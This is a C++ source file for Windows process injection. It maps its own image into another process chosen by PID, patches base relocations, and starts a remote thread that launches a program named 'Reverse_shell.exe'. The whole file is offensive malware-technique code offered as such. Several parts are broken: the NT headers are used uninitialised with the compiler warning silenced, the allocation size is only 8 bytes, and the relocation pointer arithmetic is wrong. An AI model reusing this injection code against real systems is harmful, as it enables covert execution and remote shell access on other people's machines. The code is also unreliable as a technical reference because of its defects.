#include <stdio.h>
#include <Windows.h>
#include <cstdint>
#include <iostream>
#pragma warning(disable: 4700)

int execute_reverse_shell()
{
	LPCWSTR target = L"Reverse_shell.exe";

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	if (!CreateProcess(target, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		std::cerr << "CreateProcess Failed" << std::endl;
		return 1;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return 0;
}

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY; 

int main(int argc, char *argv[])
{
	DWORD target = atoi(argv[1]);

	PVOID Image_base = GetModuleHandle(NULL);		// 1
	IMAGE_NT_HEADERS ntheaders;
	
	uint64_t Image_size = ntheaders.OptionalHeader.SizeOfImage;		// 2

	LPVOID local_address = VirtualAllocEx(GetCurrentProcess(), NULL, sizeof(Image_size), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	// 3

	WriteProcessMemory(GetCurrentProcess(), local_address, Image_base, sizeof(Image_size), NULL);
	// 4

	HANDLE target_handle = OpenProcess(PROCESS_ALL_ACCESS, false, target);

	LPVOID target_address = VirtualAllocEx(target_handle, NULL, sizeof(Image_size), MEM_COMMIT, PAGE_EXECUTE_READWRITE);		// 5

	uint64_t delta = (uint64_t)target_address - (uint64_t)local_address; // 6

	PIMAGE_BASE_RELOCATION relocation_table = (PIMAGE_BASE_RELOCATION)((uint64_t)local_address + ntheaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	int relocation_count = 0;
	PDWORD_PTR patch_address;
	PBASE_RELOCATION_ENTRY relocation_RVA = NULL;

	while (relocation_table->SizeOfBlock > 0) // 7
	{
		relocation_count = (relocation_table->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
		relocation_RVA = (PBASE_RELOCATION_ENTRY)(relocation_table + 1);

		for (size_t i = 0; i < relocation_count; i++)
		{
			if (relocation_RVA[i].Offset)
			{
				patch_address = (PDWORD_PTR)((PDWORD_PTR)local_address + relocation_table->VirtualAddress + relocation_RVA[i].Offset);
				*patch_address += delta;
			}
		}

		relocation_table = (PIMAGE_BASE_RELOCATION)((PDWORD_PTR)relocation_table + relocation_table->SizeOfBlock);
	}

	WriteProcessMemory(target_handle, target_address, local_address, Image_size, NULL); // 8

	CreateRemoteThread(target_handle, NULL, 0, (LPTHREAD_START_ROUTINE)((PDWORD_PTR)execute_reverse_shell + delta), NULL, NULL, NULL);
	
	return 0;
}